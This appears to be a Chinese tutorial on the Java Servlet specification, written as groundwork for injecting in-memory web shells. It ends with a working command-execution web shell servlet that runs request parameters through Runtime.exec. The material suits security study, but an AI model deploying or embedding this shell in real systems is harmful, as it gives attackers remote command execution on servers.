# Java Servlet

Java SE 中我们可以创建 socket 服务端为用户提供服务，但需要用户使用 socket 客户端，当然也可以基于 socket 实现 HTTP 协议，WebFlux 就是这样子的存在。而在 Java EE 中，Java 制定了 Servlet 规范，来规范在 Java 中提供 HTTP 服务的编写方式，其中有两个重要的概念，Servlet 与 Servlet Container。Servlet 是基于 Java 的 Web 组件，由容器进行管理，提供动态内容。Servlet 容器用于提供基于请求/响应发送模式的服务，必须支持 HTTP，并且管理 Servlet 的生命周期，使 Servlet 在一个受限的安全环境中执行。

Servlet 规范旨在让开发者基于规范开发的应用，可以部署在任意满足规范的 Web 容器上。每个 Servlet 规范版本都引入了一些新的东西，Servlet 4.0 前的版本变更可查看 [java-servlet-version-history](https://www.codejava.net/java-ee/servlet/java-servlet-version-history)。

目前常见的 Servlet 规范就是 [Servlet 3.1](https://github.com/waylau/servlet-3.1-specification/blob/master/docs), Tomcat 8.x 版本就是 Servlet 3.1 版本，从 Servlet 5.0 开始，Java EE 更名为 Jakarta EE，包路径从 javax 改为 jakarta。目前最新的 Servlet 规范是 [Servlet 6.1](https://jakarta.ee/zh/specifications/servlet/6.1/)。另外可以 [在此](https://tomcat.apache.org/whichversion.html) 查看 Tomcat 容器支持的 Servlet 规范版本。

## ServletContext

> [Servlet 3.1 规范 - 4.1 ServletContext 接口介绍](https://github.com/waylau/servlet-3.1-specification/blob/master/docs/Servlet%20Context/4.1%20Introduction%20to%20the%20ServletContext%20Interface.md)

ServletContext 定义了 Servlet 运行的 Web 应用视图，一个 Web 应用对应一个 ServletContext。

ServletContext 必须支持编程式添加 Servlet、Filter 和 Listener，对框架开发者有用处。但是规定了这些方法只能在 ServletContextListener.contexInitialized 或 ServletContainerInitializer.onStartup 应用初始化的时候调用。

```java
addServlet(String servletName, String className);
addServlet(String servletName, Servlet servlet);
addServlet(String servletName, Class <? extends Servlet> servletClass);
addFilter(String filterName, String className);
addFilter(String filterName, Filter filter);
addFilter(String filterName, Class <? extends Filter> filterClass);
void addListener(String className);
void addListener(T t);
void addListener(Class <? extends EventListener> listenerClass);
```

这就是在注入内存马时我们需要先拿 Context 的原因（已经写在了 Servlet 规范里面啦），所以针对实现了 Servlet 规范的 Web 容器都是一个套路，并且该反射调用哪些方法也写在里面了。不过在实现的时候却写了那么多代码的原因就是，其规定了这些方法只能在应用初始化的时候调用，我们注入内存马的时候已经是应用运行时了，那些代码实际上就是将方法内的具体实现重新用反射实现一遍。

## HttpServlet

99.99% 的时候，我们实现 HttpServlet 抽象类给予我们的能力就可以了，以下每个方法都对应了 HTTP Method 方法，当我们想要实现处理 Get 请求实现 doGet，处理 Post 请求就实现 doPost。

```java
protected void doGet(HttpServletRequest req, HttpServletResponse resp);
protected void doPost(HttpServletRequest req, HttpServletResponse resp);
protected void doPut(HttpServletRequest req, HttpServletResponse resp);
protected void doDelete(HttpServletRequest req, HttpServletResponse resp);
protected void doHead(HttpServletRequest req, HttpServletResponse resp);
protected void doOptions(HttpServletRequest req, HttpServletResponse resp);
protected void doTrace(HttpServletRequest req, HttpServletResponse resp);
```

Servlet 规范中规定了，对于非分布式应用来说，Servlet 容器必须确保对于每个 Servlet 定义只存在一个实例，但是 Web 服务是多线程的，所以 Servlet 是线程不安全的，在 Servlet 中的成员变量都是线程不安全的。

针对 Servlet 的路径映射提供了注解的方式和 web.xml 方法，以下两种方式都能定义访问 `/foo` 即调用 CalculatorServlet 中对应的实现方法。

```java
@WebServlet(”/foo”)
public class CalculatorServlet extends HttpServlet{
//...
}
```

```xml
<servlet>
    <servlet-name>foo</servlet-name>
    <servlet-class>org.example.CalculatorServlet</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>foo</servlet-name>
    <url-pattern>/foo</url-pattern>
</servlet-mapping>
```

## ServletShell

shell 的目的，就是为了定义一个入口，我们能与 Web 服务器进行交互。以下定义了一个命令回显的 ServletShell。

1. doGet 调用转发给 doPost，这样我们即支持 GET 也支持 POST，防止某些情况下有请求方法的限制。
2. 交互的入口是 `request.getParameter` 支持两种方式传参。GET/POST 请求发送 `/?paramName=whoami`，也可以发送 POST 请求时使用 `application/x-www-form-urlencoded` 发送 body 参数。`multipart/form-data` 是不支持从 `request.getParameter` 获取参数的。

```java
public class CommandServlet extends HttpServlet {
    public static String paramName;

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doPost(req, resp);
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String cmd = request.getParameter(paramName);
        if (cmd != null) {
            Process exec = Runtime.getRuntime().exec(cmd);
            InputStream inputStream = exec.getInputStream();
            ServletOutputStream outputStream = response.getOutputStream();
            byte[] buf = new byte[8192];
            int length;
            while ((length = inputStream.read(buf)) != -1) {
                outputStream.write(buf, 0, length);
            }
        }
    }
}
```
